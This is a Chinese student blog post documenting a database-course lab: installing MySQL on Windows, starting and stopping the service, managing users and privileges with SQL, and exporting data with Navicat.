    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验一：认识DBMS系统"><a href="#《数据库系统概论》课程之实验一：认识DBMS系统" class="headerlink" title="《数据库系统概论》课程之实验一：认识DBMS系统"></a>《数据库系统概论》课程之实验一：认识DBMS系统</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li><p>通过对某个商用数据库管理系统的使用，了解DBMS的工作原理和系统构架。</p></li><li><p>熟悉对DBMS的操作。</p></li><li>搭建今后实验的平台。</li></ol><h2 id="实验平台"><a href="#实验平台" class="headerlink" title="实验平台"></a>实验平台</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p>Windows 10</p><h3 id="数据库管理系统"><a href="#数据库管理系统" class="headerlink" title="数据库管理系统"></a>数据库管理系统</h3><p>MySQL</p><h2 id="实验流程"><a href="#实验流程" class="headerlink" title="实验流程"></a>实验流程</h2><h3 id="1-安装与启动"><a href="#1-安装与启动" class="headerlink" title="1 安装与启动"></a>1 安装与启动</h3><h4 id="1-根据安装文件的说明安装数据库管理系统。"><a href="#1-根据安装文件的说明安装数据库管理系统。" class="headerlink" title="1. 根据安装文件的说明安装数据库管理系统。"></a>1. <strong>根据安装文件的说明安装数据库管理系统。</strong></h4><ol><li>前往官网（www.mysql.com）下载Mysql的安装包。点击DOWNLOADS，选择免费的版本MYSQL Community（GPL）Downloads，再选择适用于当前操作系统Windows的安装版MySQL Installer for Windows，下载完整版Windows (x86, 32-bit), MSI Installer。</li></ol><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220416175855668.png" alt="image-20220416175855668"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220416175901277.png" alt="image-20220416175901277"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220416175908694.png" alt="image-20220323095532345"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323095551523.png" alt="image-20220323095551523"></p><ol><li><p>打开下载好的安装程序。选择默认的安装类型（包含MySQL Server就可以），点击“Next”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323095654235.png" alt="image-20220323095654235"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323095733661.png" alt="image-20220323095733661"></p></li><li><p>点击“Execute”开始安装。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323095751106.png" alt="image-20220323095751106"></p></li><li><p>全部安装完成后再点击“Next”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323095808455.png" alt="image-20220323095808455"></p></li><li><p>接下来的服务器配置、认证方法按照默认的，点击“Next”即可。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100040909.png" alt="image-20220323100040909"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100045375.png" alt="image-20220323100045375"></p></li><li><p>输入root账户的密码。完成后点击“Next”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100108767.png" alt="image-20220323100108767"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100113320.png" alt="image-20220323100113320"></p></li><li><p>输入MySQL主机名。完成后点击“Next”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100130591.png" alt="image-20220323100130591"></p></li><li><p>点击“Execute”应用配置。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100255637.png" alt="image-20220323100255637"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100303213.png" alt="image-20220323100303213"></p></li><li><p>接下来点击“Next”和“Finish”，完成产品配置和路由器配置。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100334915.png" alt="image-20220323100334915"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100345627.png" alt="image-20220323100345627"></p></li><li><p>输入密码，点击“Check”，确保连接至服务器。然后“Next”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100359594.png" alt="image-20220323100359594"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100408828.png" alt="image-20220323100408828"></p></li><li><p>再次点击“Execute”应用服务器配置。然后点击“Finish”。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100422753.png" alt="image-20220323100422753"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100425706.png" alt="image-20220323100425706"></p></li><li><p>点击“Next”，然后点击“Finish”。安装完成。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100440615.png" alt="image-20220323100440615"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100444305.png" alt="image-20220323100444305"></p></li></ol><h4 id="2-启动和停止数据库服务"><a href="#2-启动和停止数据库服务" class="headerlink" title="2. 启动和停止数据库服务"></a>2. 启动和停止数据库服务</h4><p>学会启动和停止数据库服务，思考可以用哪些方式来完成启动和停止。</p><ol><li><p>使用命令行：</p><ul><li><p>以管理员身份打开命令提示符。</p></li><li><p><strong>启动</strong>：<code>net start mysql80</code></p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323100948687.png" alt="image-20220323100948687"></p></li><li><p><strong>停止</strong>：<code>net stop mysql80</code></p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323101041767.png" alt="image-20220323101041767"></p></li></ul></li><li><p>通过“服务”界面</p><ul><li><p>右击“此电脑”-&gt;“计算机管理”-&gt;“服务和应用程序”-&gt;“服务”，找到“MySQL80”</p></li><li><p>右击“MySQL80”，可以选择“启动”、“停止”、“重新启动”等。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323101628728.png" alt="image-20220323101628728"></p></li></ul></li></ol><h4 id="3-初步了解MySQL的安全性"><a href="#3-初步了解MySQL的安全性" class="headerlink" title="3. 初步了解MySQL的安全性"></a>3. 初步了解MySQL的安全性</h4><p>这里主要是用户的登录和服务器预定义角色。可以尝试建立一个新的用户，赋予其数据库管理员的角色，今后的实验可以用该用户来创建数据库应用。</p><ul><li><p>在安装MySQL时，默认创建了一个<code>root</code>用户作为数据库的管理者。</p><ul><li><p>登录：<code>mysql -u root -p</code>，输入密码。</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323102758220.png" alt="image-20220323102758220"></p></li></ul></li><li><p>在MySQL中建立新用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">CREATE USER &#x27;newuser&#x27;@&#x27;hostname&#x27; IDENTIFIED BY &#x27;user_password&#x27;;<br></code></pre></div></td></tr></table></figure><p>例：创建一个密码为<code>wyh123456</code>的mysql用户<code>wyh</code>。<code>hostname</code>=<code>localhost</code>表示该用户只能从<code>localhost</code>即运行MySQL Server的系统连接到MySQL服务器。</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;wyh&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;wyh123456&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323102832861.png" alt="image-20220323102832861"></p></li><li><p>授权用户可以操作的数据库和表：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">#授权<br>grant &#x27;权限&#x27; on &#x27;数据库名.表名&#x27; to &#x27;用户名&#x27;@&#x27;主机名&#x27; with grant option;<br>#刷新权限<br>flush privileges; <br></code></pre></div></td></tr></table></figure><p>例：授予用户<code>wyh</code> 操作数据库<code>db3</code>所有表的所有权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">grant all privileges on db3.* to &#x27;wyh&#x27;@&#x27;localhost&#x27; with grant option;<br>flush privileges; <br></code></pre></div></td></tr></table></figure><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323103754893.png" alt="image-20220323103754893"></p></li><li><p>查看所有用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT user,host FROM mysql.user;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323104253917.png" alt="image-20220323104253917"></p></li><li><p>查看用户<code>wyh</code>的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show grants for &#x27;wyh&#x27;@&#x27;localhost&#x27;;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323104435891.png" alt="image-20220323104435891"></p></li><li><p>收回权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE &#x27;权限&#x27; ON &#x27;数据库名.表名&#x27; FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;<br></code></pre></div></td></tr></table></figure><p>例：收回用户<code>wyh</code> 操作数据库<code>db3</code>所有表的所有权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">REVOKE all privileges ON db3.* FROM &#x27;wyh&#x27;@&#x27;localhost&#x27;;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323105508974.png" alt="image-20220323105508974"></p></li><li><p>删除用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">DROP USER `用户名`@`主机名`;<br></code></pre></div></td></tr></table></figure><p>例：删除主机<code>localhost</code>用户<code>wyh</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">DROP USER `wyh`@`localhost`;<br></code></pre></div></td></tr></table></figure><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220323105844878.png" alt="image-20220323105844878"></p></li></ul><h3 id="2-数据库系统的构架"><a href="#2-数据库系统的构架" class="headerlink" title="2 数据库系统的构架"></a>2 数据库系统的构架</h3><h4 id="了解数据库系统的逻辑组件："><a href="#了解数据库系统的逻辑组件：" class="headerlink" title="了解数据库系统的逻辑组件："></a>了解数据库系统的逻辑组件：</h4><p>它们主要是数据库对象，包括基本表、视图、触发器、存储过程、约束等。今后将学习如何操作这些数据库对象。</p><ul><li>基本表是实际存在的表，它是实际存储数据的逻辑表示</li><li>视图表是由基本表或其他视图表导出的表，是虚表，不对应实际存储的数据。</li><li>触发器是与表有关的数据库对象，在满足定义条件时触发，并执行触发器中定义的语句集合。</li><li>存储过程是一组为了完成特定功能的SQL语句集。</li><li>约束实际上就是表中数据的限制条件。</li></ul><h4 id="了解数据库的物理组件："><a href="#了解数据库的物理组件：" class="headerlink" title="了解数据库的物理组件："></a>了解数据库的物理组件：</h4><p>思考数据库物理存储的存储单位是什么，数据主要以什么方式存放，如何确定数据的存放位置。</p><ul><li><p>在数据库中，<strong>表</strong>是数据物理存储的最主要、最基本的单位。</p></li><li><p>数据主要以块的方式存放在磁盘。</p></li><li><p>mysql通过以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">show variables like &#x27;datadir&#x27;<br></code></pre></div></td></tr></table></figure><p>确定数据的存放位置。</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324210249301.png" alt="image-20220324210249301"></p></li></ul><h3 id="3-MySQL的管理和使用"><a href="#3-MySQL的管理和使用" class="headerlink" title="3 MySQL的管理和使用"></a>3 MySQL的管理和使用</h3><p>​        了解MySQL如何通过Navicat对数据和数据库服务器进行管理和使用的。</p><h4 id="连接MySQL"><a href="#连接MySQL" class="headerlink" title="连接MySQL"></a>连接MySQL</h4><ul><li><p>点击“连接”-“MySQL”：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211040249.png" alt="image-20220324211040249"></p></li><li><p>输入信息，点击“确定”：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211202615.png" alt="image-20220324211202615"></p></li><li><p>连接创建完成：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211259701.png" alt="image-20220324211259701"></p></li></ul><h4 id="数据迁移工具"><a href="#数据迁移工具" class="headerlink" title="数据迁移工具"></a>数据迁移工具</h4><ul><li><p>跨数据库迁移：</p><ul><li><p>点击“工具”-“数据传输”：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211618308.png" alt="image-20220324211618308"></p></li><li><p>选择要传输的数据库对象：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211656010.png" alt="image-20220324211656010"></p></li><li><p>点击开始，传输结果如下：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211732530.png" alt="image-20220324211732530"></p></li></ul></li><li><p>导出数据</p><ul><li><p>右击需要导出的数据表，点击“导出向导”：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324211941676.png" alt="image-20220324211941676"></p></li><li><p>选择导出格式：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324212216445.png" alt="image-20220324212216445"></p></li><li><p>选择要导出的文件：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324212247255.png" alt="image-20220324212247255"></p></li><li><p>选择要导出的字段：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324212308726.png" alt="image-20220324212308726"></p></li><li><p>定义”附加选项“：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324212333245.png" alt="image-20220324212333245"></p></li><li><p>开始导出：</p><p> <img 